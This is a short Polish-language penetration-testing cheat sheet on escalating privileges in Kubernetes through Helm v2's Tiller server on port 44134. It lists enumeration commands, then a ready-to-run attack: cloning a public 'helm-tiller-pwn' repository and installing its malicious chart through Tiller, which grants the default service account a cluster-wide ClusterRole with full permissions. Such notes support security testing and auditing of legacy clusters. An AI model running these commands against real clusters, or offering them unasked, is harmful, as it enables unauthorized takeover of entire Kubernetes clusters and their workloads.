# Helm/Tiller -- Eskalacja Uprawnien w Kubernetes

## Informacje podstawowe
- **Port domyslny**: 44134 (Tiller -- komponent serwerowy Helm v2)
- **UWAGA**: Helm v2 z Tillerem jest przestarzaly, ale wciaz spotykany

## Enumeracja
```bash
kubectl get pods -n kube-system | grep -i "tiller"
kubectl get services -n kube-system | grep -i "tiller"
nmap -sS -p 44134 <IP>
helm --host tiller-deploy.kube-system:44134 version
```

## Eskalacja uprawnien
- Tiller domyslnie dziala w `kube-system` z **wysokimi uprawnieniami**
- Zainstalowanie zlsliwego chartu daje pelny dostep do klastra:
  ```bash
  git clone https://github.com/Ruil1n/helm-tiller-pwn
  helm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn/pwnchart
  ```
- Efekt: domyslny service account uzyskuje **ClusterRole z pelnymi uprawnieniami** do calego klastra
